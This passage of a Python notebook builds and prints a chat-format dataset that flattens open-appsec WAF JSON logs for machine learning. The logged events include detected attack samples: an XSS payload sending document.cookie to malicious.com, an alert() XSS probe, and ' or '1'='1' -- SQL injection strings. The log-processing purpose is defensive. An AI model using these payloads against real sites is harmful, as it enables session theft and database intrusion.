    for i in range(min(60, len(dataset))):
        print(f"Bản ghi {i}:")
        print(dataset[i])

view_dataset(combined_dataset, "Final Dataset")
# Out:
# Kiểm tra reasoning_conversations:
# Chuỗi 0:
# {'input': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Threat Prevention"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 1}}', 'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Threat Prevention", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 1, "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": null, "eventSource_assetName": null, "eventData_matchedSample": null, "eventData_waapFinalScore": null, "eventData_eventConfidence": null, "eventData_waapIncidentType": null, "eventData_serviceName": null, "eventData_httpHostName": null, "eventData_practiceType": null, "eventSource_assetId": null, "eventData_learnedIndicators": null, "eventData_eventReferenceId": null, "eventData_assetName": null, "eventData_matchedLocation": null, "eventData_waapOverride": null, "eventData_httpSourceId": null, "eventData_matchedIndicators": null, "eventData_matchedParameter": null, "eventData_waapUriFalsePositiveScore": null, "eventData_waapUserReputation": null, "eventData_ruleId": null, "eventData_waapKeywordsScore": null, "eventTags_1": null, "eventData_reservedNgenA": null, "eventData_sourcePort": null, "eventData_sourceIP": null, "eventData_securityAction": null, "eventData_practiceSubType": null}', 'input_role': 'user', 'content_role': 'assistant', 'conversations': [{'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Threat Prevention"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 1}}\ndo log processing for me from above file into understandable form for machine learning to read', 'role': 'user'}, {'content': '{"eventTime": "2025-06-20T14:04:40.273", "eventName": "Web AppSec Policy Loaded Successfully", "eventSeverity": "Info", "eventPriority": "Low", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Threat Prevention", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 1, "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": nul ...
# Chuỗi 1:
# {'input': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Informational"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "1.1.26-open-source", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 2, "serviceName": "HTTP Transaction Handler"}}', 'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Informational", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "1.1.26-open-source", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 2, "eventData_serviceName": "HTTP Transaction Handler", "eventData_assetId": null, "eventData_practiceId": null, "eventData_waapFoundIndicators": null, "eventData_httpMethod": null, "eventData_ruleName": null, "eventData_practiceName": null, "eventData_waapUserReputationScore": null, "eventData_waapCalculatedThreatLevel": null, "eventSource_assetName": null, "eventData_matchedSample": null, "eventData_waapFinalScore": null, "eventData_eventConfidence": null, "eventData_waapIncidentType": null, "eventData_httpHostName": null, "eventData_practiceType": null, "eventSource_assetId": null, "eventData_learnedIndicators": null, "eventData_eventReferenceId": null, "eventData_assetName": null, "eventData_matchedLocation": null, "eventData_waapOverride": null, "eventData_httpSourceId": null, "eventData_matchedIndicators": null, "eventData_matchedParameter": null, "eventData_waapUriFalsePositiveScore": null, "eventData_waapUserReputation": null, "eventData_ruleId": null, "eventData_waapKeywordsScore": null, "eventTags_1": null, "eventData_reservedNgenA": null, "eventData_sourcePort": null, "eventData_sourceIP": null, "eventData_securityAction": null, "eventData_practiceSubType": null}', 'input_role': 'user', 'content_role': 'assistant', 'conversations': [{'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags": ["Informational"], "eventSource": {"agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventTraceId": "", "eventSpanId": "", "issuingEngineVersion": "1.1.26-open-source", "serviceName": "HTTP Transaction Handler", "serviceId": "1"}, "eventData": {"logIndex": 2, "serviceName": "HTTP Transaction Handler"}}\ndo log processing for me from above file into understandable form for machine learning to read', 'role': 'user'}, {'content': '{"eventTime": "2025-06-20T14:04:40.719", "eventName": "Check Point Nano-service started", "eventSeverity": "Info", "eventPriority": "Medium", "eventType": "Event Driven", "eventLevel": "Log", "eventLogLevel": "info", "eventAudience": "Security", "eventAudienceTeam": "", "eventFrequency": 0, "eventTags_0": "Informational", "eventSource_agentId": "fbfb6a19-daf7-41e5-a25c-bf3a1472e97a", "eventSource_eventTraceId": "", "eventSource_eventSpanId": "", "eventSource_issuingEngineVersion": "1.1.26-open-source", "eventSource_serviceName": "HTTP Transaction Handler", "eventSource_serviceId": "1", "eventData_logIndex": 2, "eventData_serviceName": "HTTP Transaction Handler", "eventData_assetId": null, "eventData_practiceId": null, "even ...
#
# Tạo Dataset cuối cùng...
# Map:   0%|          | 0/62 [00:00<?, ? examples/s]
# --- Xem Final Dataset ---
# Số bản ghi: 62
# Các cột: ['text']
# Mẫu 2 bản ghi đầu tiên:
# Bản ghi 0:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-21T15:06:06.956\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Medium\\", \\"eventPriority\\": \\"Medium\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"Unknown\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 8, \\"eventReferenceId\\": \\"baa50603-e006-43d5-861f-facdcdb6e01e\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Medium\\", \\"sourceIP\\": \\"192.168.136.231\\", \\"httpSourceId\\": \\"192.168.136.231\\", \\"sourcePort\\": 56265, \\"httpHostName\\": \\"192.168.136.147:82\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"General\\", \\"matchedSample\\": \\"o\'reilly\\", \\"matchedLocation\\": \\"body\\", \\"matchedParameter\\": \\"username\\", \\"waapFoundIndicators\\": \\"[\', probing]\\", \\"matchedIndicators\\": \\"[\', probing]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 128, \\"waapUserReputation\\": \\"Low\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 184, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 286, \\"waapCalculatedThreatLevel\\": 2}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-21T15:06:06.956\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Medium\\", \\"eventPriority\\": \\"Medium\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"Unknown\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 8, \\"eventData_eventReferenceId\\": \\"baa50603-e006-43d5-861f-facdcdb6e01e\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Medium\\", \\"eventData_sourceIP\\": \\"192.168.136.231\\", \\"eventData_httpSourceId\\": \\"192.168.136.231\\", \\"eventData_sourcePort\\": 56265, \\"eventData_httpHostName\\": \\"192.168.136.147:82\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\\", \\"eventData_practiceSubType\\": \\"Web Application\\", \\"eventData_ruleName\\": \\"Any\\", \\"eventData_practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"eventData_practiceName\\": \\"local_policy/appsec-best-practice\\", \\"eventData_waapIncidentType\\": \\"General\\", \\"eventData_matchedSample\\": \\"o\'reilly\\", \\"eventData_matchedLocation\\": \\"body\\", \\"eventData_matchedParameter\\": \\"username\\", \\"eventData_waap ...
# Bản ghi 1:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-21T15:24:18.912\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"Unknown\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 14, \\"eventReferenceId\\": \\"b6951c9e-fd66-4f84-a7f1-0d7c33e2e70b\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.158\\", \\"httpSourceId\\": \\"192.168.136.158\\", \\"sourcePort\\": 56302, \\"httpHostName\\": \\"192.168.136.147:82\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"Cross Site Scripting, Remote Code Execution\\", \\"matchedSample\\": \\"username=<script>fetch(\'https://malicious.com?cookie=\' document.cookie)</script>\\", \\"matchedLocation\\": \\"body\\", \\"matchedParameter\\": \\"password\\", \\"waapFoundIndicators\\": \\"[\', <, <script, =, >, code_execution_fast_reg_0, document., document.cookie]\\", \\"matchedIndicators\\": \\"[\', <, <script, =, >, code_execution_fast_reg_0, document., document.cookie]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 153, \\"waapUserReputation\\": \\"Low\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 855, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-21T15:24:18.912\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"Unknown\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 14, \\"eventData_eventReferenceId\\": \\"b6951c9e-fd66-4f84-a7f1-0d7c33e2e70b\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.158\\", \\"eventData_httpSourceId\\": \\"192.168.136.158\\", \\"eventData_sourcePort\\": 56302, \\"eventData_httpHostName\\": \\"192.168.136.147:82\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\\", \\"eventData_practiceSubType\\": \\"Web Application\\", \\"eventData_ruleName\\": \\"Any\\", \\"eventData_practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"eventData_practiceName\\": \\"l ...
# Bản ghi 2:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:08:10.400\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 5, \\"eventReferenceId\\": \\"28cf53cd-7585-408d-87ca-623dd9be381b\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.1\\", \\"httpSourceId\\": \\"192.168.136.1\\", \\"sourcePort\\": 50546, \\"httpHostName\\": \\"192.168.136.128\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"423a7eb6-16d7-494d-8d55-dd8bd4780d1c\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"Cross Site Scripting, Remote Code Execution\\", \\"matchedSample\\": \\"http://192.168.136.128/<script>alert(\'xss test\')</script>\\", \\"matchedLocation\\": \\"referer\\", \\"matchedParameter\\": \\"\\", \\"waapFoundIndicators\\": \\"[\', <, <script, >, alert(, probing, regex_code_execution_1]\\", \\"matchedIndicators\\": \\"[\', <, <script, >, alert(, probing, regex_code_execution_1]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 437, \\"waapUserReputation\\": \\"Normal\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 894, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:08:10.400\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 5, \\"eventData_eventReferenceId\\": \\"28cf53cd-7585-408d-87ca-623dd9be381b\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.1\\", \\"eventData_httpSourceId\\": \\"192.168.136.1\\", \\"eventData_sourcePort\\": 50546, \\"eventData_httpHostName\\": \\"192.168.136.128\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\\", \\"eventData_practiceSubType\\": \\"Web Application\\", \\"eventData_ruleName\\": \\"Any\\", \\"eventData_practiceId\\": \\"423a7eb6-16d7-494d-8d55-dd8bd4780d1c\\", \\"eventData_practiceName\\": \\"local_policy/appse ...
# Bản ghi 3:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:41:17.260\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 13, \\"eventReferenceId\\": \\"90abeccd-be77-4079-a147-f761016e95af\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.1\\", \\"httpSourceId\\": \\"192.168.136.1\\", \\"sourcePort\\": 50912, \\"httpHostName\\": \\"192.168.136.128\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"SQL Injection\\", \\"matchedSample\\": \\"\\\\\\"\' or \'1\'=\'1\' --\\\\\\",\\", \\"matchedLocation\\": \\"body\\", \\"matchedParameter\\": \\"username\\", \\"waapFoundIndicators\\": \\"[\\\\\\", \', \'=\', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]\\", \\"matchedIndicators\\": \\"[\\\\\\", \', \'=\', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 132, \\"waapUserReputation\\": \\"Low\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 971, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:41:17.260\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 13, \\"eventData_eventReferenceId\\": \\"90abeccd-be77-4079-a147-f761016e95af\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.1\\", \\"eventData_httpSourceId\\": \\"192.168.136.1\\", \\"eventData_sourcePort\\": 50912, \\"eventData_httpHostName\\": \\"192.168.136.128\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\ ...
# Bản ghi 4:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-21T10:20:17.514\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 27, \\"eventReferenceId\\": \\"459dd883-6491-48a6-9cfc-c08cd7fc0c0c\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.1\\", \\"httpSourceId\\": \\"192.168.136.1\\", \\"sourcePort\\": 54001, \\"httpHostName\\": \\"192.168.136.147:82\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"SQL Injection\\", \\"matchedSample\\": \\"\\\\\\"\' or \'1\'=\'1\' --\\\\\\",\\", \\"matchedLocation\\": \\"body\\", \\"matchedParameter\\": \\"username\\", \\"waapFoundIndicators\\": \\"[\\\\\\", \', \'=\', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]\\", \\"matchedIndicators\\": \\"[\\\\\\", \', \'=\', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 185, \\"waapUserReputation\\": \\"Low\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 971, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-21T10:20:17.514\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 27, \\"eventData_eventReferenceId\\": \\"459dd883-6491-48a6-9cfc-c08cd7fc0c0c\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.1\\", 